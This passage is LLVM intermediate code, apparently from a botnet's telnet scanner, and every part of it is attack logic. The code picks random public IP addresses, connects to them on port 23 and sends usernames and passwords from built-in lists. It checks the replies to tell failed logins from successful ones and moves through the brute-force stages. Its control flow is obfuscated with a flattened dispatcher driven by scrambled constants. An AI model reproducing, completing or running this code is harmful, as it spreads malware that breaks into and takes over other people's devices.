  %133 = call i32 @getRandomPublicIP()
  %134 = load i32, i32* %1, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %135
  %137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %136, i32 0, i32 1
  store i32 %133, i32* %137, align 4
  store i32 -436185225, i32* %switchVar
  br label %loopEnd

; <label>:138:                                    ; preds = %loopEntry
  %139 = load i32, i32* %1, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 3
  %143 = load i8, i8* %142, align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 0
  %146 = select i1 %145, i32 -1426651107, i32 1891362902
  store i32 %146, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i32, i32* %1, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %149
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %150, i32 0, i32 5
  %152 = load i8, i8* %151, align 1
  %153 = add i8 %152, 1
  store i8 %153, i8* %151, align 1
  %154 = load i32, i32* %1, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 4
  %158 = load i8, i8* %157, align 2
  %159 = add i8 %158, 1
  store i8 %159, i8* %157, align 2
  %160 = load i32, i32* %1, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 5
  %164 = load i8, i8* %163, align 1
  %165 = zext i8 %164 to i64
  %166 = icmp eq i64 %165, 1
  %167 = select i1 %166, i32 424559759, i32 -1246952535
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = load i32, i32* %1, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 3
  store i8 1, i8* %172, align 1
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %1, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %175
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %176, i32 0, i32 4
  %178 = load i8, i8* %177, align 2
  %179 = zext i8 %178 to i64
  %180 = icmp eq i64 %179, 1
  %181 = select i1 %180, i32 -1442330642, i32 1120296967
  store i32 %181, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %1, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %184
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %185, i32 0, i32 3
  store i8 1, i8* %186, align 1
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 1891362902, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  store i32 -436185225, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %190, align 4
  %191 = call zeroext i16 @htons(i16 zeroext 23) #13
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %191, i16* %192, align 2
  %193 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %194 = getelementptr inbounds [8 x i8], [8 x i8]* %193, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %194, i8 0, i64 8, i32 4, i1 false)
  %195 = load i32, i32* %1, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %196
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %197, i32 0, i32 1
  %199 = load i32, i32* %198, align 4
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %201 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %200, i32 0, i32 0
  store i32 %199, i32* %201, align 4
  %202 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %203 = load i32, i32* %1, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %204
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %205, i32 0, i32 0
  store i32 %202, i32* %206, align 16
  %207 = load i32, i32* %1, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %208
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 16
  %212 = icmp eq i32 %211, -1
  %213 = select i1 %212, i32 -793614247, i32 -196725554
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i32, i32* %1, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %217
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 16
  %221 = load i32, i32* %1, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %222
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %223, i32 0, i32 0
  %225 = load i32, i32* %224, align 16
  %226 = call i32 (i32, i32, ...) @fcntl(i32 %225, i32 3, i8* null)
  %227 = or i32 %226, 2048
  %228 = call i32 (i32, i32, ...) @fcntl(i32 %220, i32 4, i32 %227)
  %229 = load i32, i32* %1, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 16
  %234 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %235 = call i32 @connect(i32 %233, %struct.sockaddr* %234, i32 16)
  %236 = icmp eq i32 %235, -1
  %237 = select i1 %236, i32 -67065894, i32 -753794429
  store i32 %237, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = call i32* @__errno_location() #13
  %240 = load i32, i32* %239, align 4
  %241 = icmp ne i32 %240, 115
  %242 = select i1 %241, i32 351758106, i32 -753794429
  store i32 %242, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = load i32, i32* %1, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %245
  call void @reset_telstate(%struct.telstate_t* %246)
  store i32 2108760656, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  %248 = load i32, i32* %1, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %249
  call void @advance_state(%struct.telstate_t* %250, i32 1)
  store i32 2108760656, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  store i32 -530316569, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  store i32 540234939, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %255 = getelementptr inbounds [16 x i64], [16 x i64]* %254, i64 0, i64 0
  %256 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %255) #5, !srcloc !7
  %257 = extractvalue { i64, i64* } %256, 0
  %258 = extractvalue { i64, i64* } %256, 1
  %259 = trunc i64 %257 to i32
  store i32 %259, i32* %19, align 4
  %260 = ptrtoint i64* %258 to i64
  %261 = trunc i64 %260 to i32
  store i32 %261, i32* %20, align 4
  store i32 1565826636, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 -1102309949, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %1, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %265
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %266, i32 0, i32 0
  %268 = load i32, i32* %267, align 16
  %269 = srem i32 %268, 64
  %270 = zext i32 %269 to i64
  %271 = shl i64 1, %270
  %272 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %273 = load i32, i32* %1, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %274
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %275, i32 0, i32 0
  %277 = load i32, i32* %276, align 16
  %278 = sdiv i32 %277, 64
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds [16 x i64], [16 x i64]* %272, i64 0, i64 %279
  %281 = load i64, i64* %280, align 8
  %282 = or i64 %281, %271
  store i64 %282, i64* %280, align 8
  %283 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %283, align 8
  %284 = load i32, i32* %7, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %285, i64* %286, align 8
  %287 = load i32, i32* %1, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 0
  %291 = load i32, i32* %290, align 16
  %292 = add nsw i32 %291, 1
  %293 = call i32 @select(i32 %292, %struct.__sigset_t* null, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.timeval* %11)
  store i32 %293, i32* %2, align 4
  %294 = load i32, i32* %2, align 4
  %295 = icmp eq i32 %294, 1
  %296 = select i1 %295, i32 -625855368, i32 742808537
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  store i32 4, i32* %12, align 4
  store i32 0, i32* %13, align 4
  %298 = load i32, i32* %1, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %299
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 16
  %303 = bitcast i32* %13 to i8*
  %304 = call i32 @getsockopt(i32 %302, i32 1, i32 4, i8* %303, i32* %12) #5
  %305 = load i32, i32* %13, align 4
  %306 = icmp ne i32 %305, 0
  %307 = select i1 %306, i32 -711943273, i32 -1675042194
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = load i32, i32* %1, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %310
  call void @reset_telstate(%struct.telstate_t* %311)
  store i32 1602534393, i32* %switchVar
  br label %loopEnd

; <label>:312:                                    ; preds = %loopEntry
  %313 = load i32, i32* %1, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %314
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %315, i32 0, i32 0
  %317 = load i32, i32* %316, align 16
  %318 = load i32, i32* %1, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %319
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %320, i32 0, i32 0
  %322 = load i32, i32* %321, align 16
  %323 = call i32 (i32, i32, ...) @fcntl(i32 %322, i32 3, i8* null)
  %324 = and i32 %323, -2049
  %325 = call i32 (i32, i32, ...) @fcntl(i32 %317, i32 4, i32 %324)
  %326 = load i32, i32* %1, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %327
  call void @advance_state(%struct.telstate_t* %328, i32 2)
  store i32 1602534393, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i32, i32* %2, align 4
  %332 = icmp eq i32 %331, -1
  %333 = select i1 %332, i32 655843878, i32 -1385651820
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = load i32, i32* %1, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %336
  call void @reset_telstate(%struct.telstate_t* %337)
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  store i32 -746353829, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i32, i32* %1, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %341
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %342, i32 0, i32 7
  %344 = load i32, i32* %343, align 16
  %345 = add i32 %344, 3
  %346 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %347 = icmp ult i32 %345, %346
  %348 = select i1 %347, i32 1724614755, i32 -1244231729
  store i32 %348, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i32, i32* %1, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %351
  call void @reset_telstate(%struct.telstate_t* %352)
  store i32 -1244231729, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  store i32 -530316569, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = load i32, i32* %1, align 4
  %356 = sext i32 %355 to i64
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 0
  %359 = load i32, i32* %358, align 16
  %360 = load i32, i32* %7, align 4
  %361 = load i32, i32* %1, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %362
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %363, i32 0, i32 9
  %365 = load i8*, i8** %364, align 8
  %366 = call i32 @read_until_response(i32 %359, i32 %360, i8* %365, i32 512, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %367 = icmp ne i32 %366, 0
  %368 = select i1 %367, i32 -1547451391, i32 -167712634
  store i32 %368, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i32, i32* %1, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %371
  %373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %372, i32 0, i32 9
  %374 = load i8*, i8** %373, align 8
  %375 = call i32 @contains_fail(i8* %374)
  %376 = icmp ne i32 %375, 0
  %377 = select i1 %376, i32 -1967981378, i32 -355267141
  store i32 %377, i32* %switchVar
  br label %loopEnd

; <label>:378:                                    ; preds = %loopEntry
  %379 = load i32, i32* %1, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %380
  call void @advance_state(%struct.telstate_t* %381, i32 0)
  store i32 1080257533, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %1, align 4
  %384 = sext i32 %383 to i64
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %384
  call void @advance_state(%struct.telstate_t* %385, i32 3)
  store i32 1080257533, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:387:                                    ; preds = %loopEntry
  %388 = load i32, i32* %1, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %389
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %390, i32 0, i32 7
  %392 = load i32, i32* %391, align 16
  %393 = add i32 %392, 3
  %394 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %395 = icmp ult i32 %393, %394
  %396 = select i1 %395, i32 241113800, i32 -519040166
  store i32 %396, i32* %switchVar
  br label %loopEnd

; <label>:397:                                    ; preds = %loopEntry
  %398 = load i32, i32* %1, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %399
  call void @reset_telstate(%struct.telstate_t* %400)
  store i32 -519040166, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  store i32 -530316569, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = load i32, i32* %1, align 4
  %404 = sext i32 %403 to i64
  %405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %404
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %405, i32 0, i32 0
  %407 = load i32, i32* %406, align 16
  %408 = load i32, i32* %1, align 4
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %409
  %411 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %410, i32 0, i32 4
  %412 = load i8, i8* %411, align 2
  %413 = zext i8 %412 to i64
  %414 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %413
  %415 = load i8*, i8** %414, align 8
  %416 = load i32, i32* %1, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 4
  %420 = load i8, i8* %419, align 2
  %421 = zext i8 %420 to i64
  %422 = getelementptr inbounds [1 x i8*], [1 x i8*]* @usernames, i64 0, i64 %421
  %423 = load i8*, i8** %422, align 8
  %424 = call i64 @strlen(i8* %423) #10
  %425 = call i64 @send(i32 %407, i8* %415, i64 %424, i32 16384)
  %426 = icmp slt i64 %425, 0
  %427 = select i1 %426, i32 1805370421, i32 -1601444231
  store i32 %427, i32* %switchVar
  br label %loopEnd

; <label>:428:                                    ; preds = %loopEntry
  %429 = load i32, i32* %1, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %430
  call void @reset_telstate(%struct.telstate_t* %431)
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:432:                                    ; preds = %loopEntry
  %433 = load i32, i32* %1, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %434
  %436 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 16
  %438 = call i64 @send(i32 %437, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i32 0, i32 0), i64 2, i32 16384)
  %439 = icmp slt i64 %438, 0
  %440 = select i1 %439, i32 -1951238615, i32 1774313942
  store i32 %440, i32* %switchVar
  br label %loopEnd

; <label>:441:                                    ; preds = %loopEntry
  %442 = load i32, i32* %1, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %443
  call void @reset_telstate(%struct.telstate_t* %444)
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = load i32, i32* %1, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %447
  call void @advance_state(%struct.telstate_t* %448, i32 4)
  store i32 -530316569, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load i32, i32* %1, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %451
  %453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %452, i32 0, i32 0
  %454 = load i32, i32* %453, align 16
  %455 = load i32, i32* %7, align 4
  %456 = load i32, i32* %1, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %457
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %458, i32 0, i32 9
  %460 = load i8*, i8** %459, align 8
  %461 = call i32 @read_until_response(i32 %454, i32 %455, i8* %460, i32 512, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %462 = icmp ne i32 %461, 0
  %463 = select i1 %462, i32 1018917067, i32 -818172623
  store i32 %463, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i32, i32* %1, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %466
  %468 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %467, i32 0, i32 9
  %469 = load i8*, i8** %468, align 8
  %470 = call i32 @contains_fail(i8* %469)
  %471 = icmp ne i32 %470, 0
  %472 = select i1 %471, i32 -1206526110, i32 -2035984850
  store i32 %472, i32* %switchVar
  br label %loopEnd

; <label>:473:                                    ; preds = %loopEntry
  %474 = load i32, i32* %1, align 4
  %475 = sext i32 %474 to i64
  %476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %475
  call void @advance_state(%struct.telstate_t* %476, i32 0)
  store i32 649005541, i32* %switchVar
  br label %loopEnd

; <label>:477:                                    ; preds = %loopEntry
  %478 = load i32, i32* %1, align 4
  %479 = sext i32 %478 to i64
  %480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %479
  call void @advance_state(%struct.telstate_t* %480, i32 5)
  store i32 649005541, i32* %switchVar
  br label %loopEnd

; <label>:481:                                    ; preds = %loopEntry
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load i32, i32* %1, align 4
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %484
  %486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %485, i32 0, i32 7
  %487 = load i32, i32* %486, align 16
  %488 = add i32 %487, 6
  %489 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %490 = icmp ult i32 %488, %489
  %491 = select i1 %490, i32 1963342919, i32 955648949
  store i32 %491, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %493 = load i32, i32* %1, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %494
  call void @reset_telstate(%struct.telstate_t* %495)
  store i32 955648949, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  store i32 -530316569, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = load i32, i32* %1, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 0
  %502 = load i32, i32* %501, align 16
  %503 = load i32, i32* %1, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %504
  %506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %505, i32 0, i32 5
  %507 = load i8, i8* %506, align 1
  %508 = zext i8 %507 to i64
  %509 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %508
  %510 = load i8*, i8** %509, align 8
  %511 = load i32, i32* %1, align 4
  %512 = sext i32 %511 to i64
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %512
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %513, i32 0, i32 5
  %515 = load i8, i8* %514, align 1
  %516 = zext i8 %515 to i64
  %517 = getelementptr inbounds [1 x i8*], [1 x i8*]* @passwords, i64 0, i64 %516
  %518 = load i8*, i8** %517, align 8
  %519 = call i64 @strlen(i8* %518) #10
  %520 = call i64 @send(i32 %502, i8* %510, i64 %519, i32 16384)
  %521 = icmp slt i64 %520, 0
  %522 = select i1 %521, i32 -844485240, i32 -926175402
  store i32 %522, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  %524 = load i32, i32* %1, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %525
  call void @reset_telstate(%struct.telstate_t* %526)
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:527:                                    ; preds = %loopEntry
  %528 = load i32, i32* %1, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 0
  %532 = load i32, i32* %531, align 16
  %533 = call i64 @send(i32 %532, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i32 0, i32 0), i64 2, i32 16384)
  %534 = icmp slt i64 %533, 0
  %535 = select i1 %534, i32 820028042, i32 -1420498009
  store i32 %535, i32* %switchVar
  br label %loopEnd

; <label>:536:                                    ; preds = %loopEntry
  %537 = load i32, i32* %1, align 4
  %538 = sext i32 %537 to i64
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %538
  call void @reset_telstate(%struct.telstate_t* %539)
  store i32 625756886, i32* %switchVar
  br label %loopEnd

; <label>:540:                                    ; preds = %loopEntry
  %541 = load i32, i32* %1, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %542
  call void @advance_state(%struct.telstate_t* %543, i32 6)
  store i32 -530316569, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  %545 = load i32, i32* %1, align 4
  %546 = sext i32 %545 to i64
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %546
  %548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %547, i32 0, i32 0
  %549 = load i32, i32* %548, align 16
  %550 = load i32, i32* %7, align 4
  %551 = load i32, i32* %1, align 4
  %552 = sext i32 %551 to i64
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %552
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %553, i32 0, i32 9
  %555 = load i8*, i8** %554, align 8
  %556 = call i32 @read_until_response(i32 %549, i32 %550, i8* %555, i32 512, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %557 = icmp ne i32 %556, 0
  %558 = select i1 %557, i32 2110204316, i32 120210548
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %561 = load i32, i32* %1, align 4
  %562 = sext i32 %561 to i64
  %563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %562
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %563, i32 0, i32 7
  store i32 %560, i32* %564, align 16
  %565 = load i32, i32* %1, align 4
  %566 = sext i32 %565 to i64
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %566
  %568 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %567, i32 0, i32 9
  %569 = load i8*, i8** %568, align 8
  %570 = call i32 @contains_fail(i8* %569)
  %571 = icmp ne i32 %570, 0
  %572 = select i1 %571, i32 669824758, i32 -1172019520
  store i32 %572, i32* %switchVar
  br label %loopEnd

; <label>:573:                                    ; preds = %loopEntry
  %574 = load i32, i32* %1, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %35, i64 %575
  call void @advance_state(%struct.telstate_t* %576, i32 0)
  store i32 646272934, i32* %switchVar
  br label %loopEnd

